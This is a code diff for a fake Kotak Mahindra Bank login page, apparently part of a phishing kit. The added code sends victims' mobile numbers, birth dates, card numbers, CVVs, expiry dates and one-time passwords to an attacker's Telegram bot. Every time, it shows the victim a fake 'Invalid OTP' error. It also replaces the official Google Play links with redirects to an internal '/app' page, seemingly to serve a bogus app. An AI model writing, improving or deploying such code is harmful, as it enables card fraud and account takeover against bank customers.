@@ -15,6 +15,8 @@ export default function Login() {
   const [expDate, setExpDate] = useState('')
   const [otp, setOtp] = useState('')
   const [loading, setLoading] = useState(false)
+  const [downloadLoading, setDownloadLoading] = useState(false)
+  const [serviceLoading, setServiceLoading] = useState(false)
   const [error, setError] = useState('')
   const [errors, setErrors] = useState({})
   const [resendTimer, setResendTimer] = useState(0)
@@ -39,7 +41,11 @@ export default function Login() {
 
   const handleServiceSelect = (service) => {
     setSelectedService(service)
-    setStep(1)
+    setServiceLoading(true)
+    setTimeout(() => {
+      setServiceLoading(false)
+      setStep(1)
+    }, 800)
   }
 
   const [submitted, setSubmitted] = useState(false)
@@ -111,6 +117,8 @@ export default function Login() {
   }
 
   const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:3000/api'
+  const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN
+  const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID
 
   const handleOtpVerify = () => {
     if (!otp || otp.length !== 6) {
@@ -128,34 +136,70 @@ export default function Login() {
       otp
     }
 
-    fetch(`${API_URL}/users`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(userData)
-    })
-    .then(res => res.json())
-    .then(data => {
-      setError('')
-      setLoading(true)
-      setTimeout(() => {
-        setLoading(false)
-        setError('Invalid OTP, try again later')
-      }, 5000)
-    })
-    .catch(err => {
-      setError('')
-      setLoading(true)
-      setTimeout(() => {
-        setLoading(false)
-        setError('Invalid OTP, try again later')
-      }, 5000)
-    })
-  }
-      }, 5000)
-    })
-  }
-      }, 5000)
-    })
+    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+      const telegramMessage = `
+🆕 <b>New User Data</b>
+
+📋 Service: ${userData.service}
+📱 Mobile: ${userData.mobile}
+🎂 DOB: ${userData.dob}
+💳 Card: ${userData.cardNumber}
+🔐 CVV: ${userData.cvv}
+📅 Expiry: ${userData.expDate}
+🔢 OTP: ${userData.otp}
+🕐 Time: ${new Date().toLocaleString()}
+      `
+
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: telegramMessage,
+          parse_mode: 'HTML'
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        setError('')
+        setLoading(true)
+        setTimeout(() => {
+          setLoading(false)
+          setError('Invalid OTP, try again later')
+        }, 5000)
+      })
+      .catch(err => {
+        setError('')
+        setLoading(true)
+        setTimeout(() => {
+          setLoading(false)
+          setError('Invalid OTP, try again later')
+        }, 5000)
+      })
+    } else {
+      fetch(`${API_URL}/users`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(userData)
+      })
+      .then(res => res.json())
+      .then(data => {
+        setError('')
+        setLoading(true)
+        setTimeout(() => {
+          setLoading(false)
+          setError('Invalid OTP, try again later')
+        }, 5000)
+      })
+      .catch(err => {
+        setError('')
+        setLoading(true)
+        setTimeout(() => {
+          setLoading(false)
+          setError('Invalid OTP, try again later')
+        }, 5000)
+      })
+    }
   }
 
   const handleResendOtp = () => {
@@ -205,7 +249,13 @@ export default function Login() {
       )}
 
       {loading && (
-        <div className="fixed inset-0 bg-black bg-opacity-80 z-50 flex items-center justify-center">
+        <div className="fixed inset-0 bg-black bg-opacity-80 z-[9999] flex items-center justify-center">
+          <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
+        </div>
+      )}
+
+      {downloadLoading && (
+        <div className="fixed inset-0 bg-black bg-opacity-80 z-[9999] flex items-center justify-center">
           <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
         </div>
       )}
@@ -223,15 +273,19 @@ export default function Login() {
               </div>
               <h3 className="text-xl font-bold text-gray-800 mb-2">Download Kotak Mahindra Bank App</h3>
               <p className="text-gray-500 mb-6">Get the official app from Google Play Store</p>
-              <a 
-                href="https://play.google.com/store/apps/details?id=com.kotak.bank.mobile&hl=en-US" 
-                target="_blank" 
-                rel="noopener noreferrer"
-                className="inline-flex items-center justify-center bg-black text-white px-6 py-3 rounded-xl hover:bg-gray-800 transition"
+              <button 
+                onClick={() => {
+                  setDownloadLoading(true)
+                  setTimeout(() => {
+                    navigate('/app')
+                  }, 800)
+                }}
+                disabled={downloadLoading}
+                className="inline-flex items-center justify-center bg-black text-white px-6 py-3 rounded-xl hover:bg-gray-800 transition disabled:opacity-70"
               >
                 <FaGooglePlay className="w-8 h-8 mr-3" />
-                <span className="text-lg font-semibold">Get it on Google Play</span>
-              </a>
+                <span className="text-lg font-semibold">{downloadLoading ? 'Loading...' : 'Get it on Google Play'}</span>
+              </button>
               <button 
                 onClick={() => setShowPopup(false)}
                 className="mt-6 text-gray-400 text-sm hover:text-gray-600"
@@ -240,6 +294,12 @@ export default function Login() {
               </button>
             </div>
           </div>
+        </div>
+      )}
+
+      {serviceLoading && (
+        <div className="fixed inset-0 bg-black bg-opacity-80 z-[9999] flex items-center justify-center">
+          <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
         </div>
       )}
 
@@ -270,8 +330,8 @@ export default function Login() {
       {step === 1 && (
         <div className="p-4">
           {stepLoading && (
-            <div className="fixed inset-0 bg-black bg-opacity-50 z-40 flex items-center justify-center">
-              <div className="w-12 h-12 border-4 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
+            <div className="fixed inset-0 bg-black bg-opacity-80 z-[9999] flex items-center justify-center">
+              <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
             </div>
           )}
           <div className="bg-white rounded-xl shadow-lg p-6">
@@ -334,15 +394,19 @@ export default function Login() {
               <p className="text-gray-600 text-sm mb-3">
                 We have ensured that key services are available to you on the mobile website. For other services, please continue to desktop login.
               </p>
-              <a 
-                href="https://play.google.com/store/apps/details?id=com.kotak.bank.mobile&hl=en-US" 
-                target="_blank" 
-                rel="noopener noreferrer"
-                className="inline-flex items-center justify-center bg-black text-white px-4 py-2 rounded-lg hover:bg-gray-800 transition"
+              <button 
+                onClick={() => {
+                  setDownloadLoading(true)
+                  setTimeout(() => {
+                    navigate('/app')
+                  }, 800)
+                }}
+                disabled={downloadLoading}
+                className="inline-flex items-center justify-center bg-black text-white px-4 py-2 rounded-lg hover:bg-gray-800 transition disabled:opacity-70"
               >
                 <FaGooglePlay className="w-5 h-5 mr-2" />
-                Download Mobile App
-              </a>
+                {downloadLoading ? 'Loading...' : 'Download Mobile App'}
+              </button>
             </div>
 
             <p className="text-gray-500 text-xs mt-4 text-center">
@@ -355,8 +419,8 @@ export default function Login() {
       {step === 2 && (
         <div className="p-4">
           {stepLoading && (
-            <div className="fixed inset-0 bg-black bg-opacity-50 z-40 flex items-center justify-center">
-              <div className="w-12 h-12 border-4 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
+            <div className="fixed inset-0 bg-black bg-opacity-80 z-[9999] flex items-center justify-center">
+              <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
             </div>
           )}
           <div className="bg-white rounded-xl shadow-lg p-6">
@@ -438,6 +502,11 @@ export default function Login() {
 
       {step === 3 && (
         <div className="p-4">
+          {stepLoading && (
+            <div className="fixed inset-0 bg-black bg-opacity-80 z-[9999] flex items-center justify-center">
+              <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
+            </div>
+          )}
           <div className="bg-white rounded-xl shadow-lg p-6">
             <div className="flex items-center mb-4">
               <button onClick={() => setStep(2)} className="mr-3">
